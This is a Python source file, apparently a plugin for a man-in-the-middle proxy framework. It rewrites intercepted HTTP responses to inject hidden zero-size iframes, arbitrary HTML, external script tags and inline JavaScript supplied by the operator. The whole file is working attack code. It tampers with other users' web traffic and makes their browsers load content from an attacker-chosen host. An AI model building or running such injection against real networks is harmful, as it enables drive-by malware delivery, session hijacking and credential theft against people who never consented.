from bs4 import BeautifulSoup
from plugins.plugin import Plugin
from libmproxy.protocol.http import decoded

class Inject(Plugin):
    name = 'Inject'
    optname = 'inject'
    desc = 'Inject arbitrary content into HTML content'
    version = '0.1'

    def response(self, context, flow):
        if context.html_url and (flow.request.host in context.html_url):
            return

        if context.js_url and (flow.request.host in context.js_url):
            return

        with decoded(flow.response):  # Remove content encoding (gzip, ...)
            html = BeautifulSoup(flow.response.content)
            if html.body:

                if context.html_url:
                    iframe = html.new_tag("iframe", src=context.html_url, frameborder=0, height=0, width=0)
                    html.body.append(iframe)
                    context.log("[Inject] Injected HTML Iframe: {}".format(flow.request.host))

                if context.html_payload:
                    payload = BeautifulSoup(context.html_payload, "html.parser")
                    html.body.append(payload)
                    context.log("[Inject] Injected HTML payload: {}".format(flow.request.host))

                if context.js_url:
                    script = html.new_tag('script', type='text/javascript', src=context.js_url)
                    html.body.append(script)
                    context.log("[Inject] Injected JS script: {}".format(flow.request.host))

                if context.js_payload:
                    tag = html.new_tag('script', type='text/javascript')
                    tag.append(context.js_payload)
                    html.body.append(tag)
                    context.log("[Inject] Injected JS payload: {}".format(flow.request.host))

                flow.response.content = str(html)
                flow.response.headers['Content-Length'] = [str(len(str(html)))]

    def plugin_options(self, options):
        options.add_argument('--html-url', dest='html_url', type=str, help='URL of the HTML to inject')
        options.add_argument('--html-payload', dest='html_payload', type=str, help='HTML string to inject')
        #options.add_argument('--html-file')
        options.add_argument('--js-url', dest='js_url', type=str, help='URL to the JS you want to inject')
        options.add_argument('--js-payload', dest='js_payload', type=str, help='JS string to inject')
        #options.add_argument('--js-file')
